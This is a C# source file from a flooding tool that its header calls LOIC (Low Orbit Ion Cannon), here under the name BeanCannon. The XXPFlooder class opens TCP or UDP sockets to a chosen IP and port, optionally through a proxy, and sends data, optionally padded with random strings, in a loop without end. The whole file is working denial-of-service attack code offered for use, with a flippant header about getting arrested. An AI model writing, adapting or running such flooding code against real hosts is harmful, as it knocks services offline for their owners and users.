/* LOIC - Low Orbit Ion Cannon
 * Released to the public domain
 * Enjoy getting v&, kids.
 */

using BeanCannon.BusinessLogic.Core.Attacks.Settings;
using BeanCannon.BusinessLogic.Core.Extensions;
using BeanCannon.BusinessLogic.Core.Factory;
using BeanCannon.BusinessLogic.Core.Net.Interfaces;
using BeanCannon.BusinessLogic.Core.Randomizers;
using System;
using System.ComponentModel;
using System.Net;
using System.Net.Sockets;

namespace BeanCannon.BusinessLogic.Core.Attacks
{
	public class XXPFlooder : BaseFlooder<XXPFlooderSettings>
	{
		public XXPFlooder(XXPFlooderSettings settings) : base(settings)
		{
		}

		protected override void OnDoWorkEvent(object sender, DoWorkEventArgs e)
		{
			try
			{
				IPEndPoint endPoint = new IPEndPoint(IPAddress.Parse(Settings.Ip), Settings.Port);

				SocketType socketType = SocketType.Unknown;
				ProtocolType protocolType = ProtocolType.Unknown;

				if (Settings.Protocol == AttackMethod.TCP)
				{
					socketType = SocketType.Stream;
					protocolType = ProtocolType.Tcp;
				}
				else
				{
					socketType = SocketType.Dgram;
					protocolType = ProtocolType.Udp;
				}

				while (State.IsFlooding)
				{
					State.Status = RequestStatus.Ready; // SET STATE TO READY //

					using (ISocket socket = SocketFactory.Instance.GetSocket(endPoint.AddressFamily, socketType, protocolType, Settings.ProxyConnectionType))
					{
						socket.NoDelay = true;
						State.Status = RequestStatus.Connecting; // SET STATE TO CONNECTING //

						if (Settings.Protocol == AttackMethod.TCP)
						{
							try
							{
								socket.WrappedConnect(endPoint);
							}
							catch
							{
								continue;
							}
						}

						socket.Blocking = Settings.WaitReply;
						State.Status = RequestStatus.Requesting; // SET STATE TO REQUESTING //

						try
						{
							while (State.IsFlooding)
							{
								State.Requested++;
								byte[] buf = System.Text.Encoding.ASCII.GetBytes(String.Concat(Settings.StreamData, (Settings.UseRandomMessage ? RandomizerHq.RandomString() : "")));

								if (Settings.Protocol == AttackMethod.TCP)
								{
									socket.Send(buf);
								}
								else
								{
									socket.SendTo(buf, SocketFlags.None, endPoint);
								}

								System.Threading.Thread.Sleep(Settings.Delay);
							}
						}
						catch { State.Failed++; }
					}
				}
			}
			// Analysis disable once EmptyGeneralCatchClause
			catch { }
			finally
			{
				State.Status = RequestStatus.Ready;
				State.IsFlooding = false;
			}
		}
	}
}
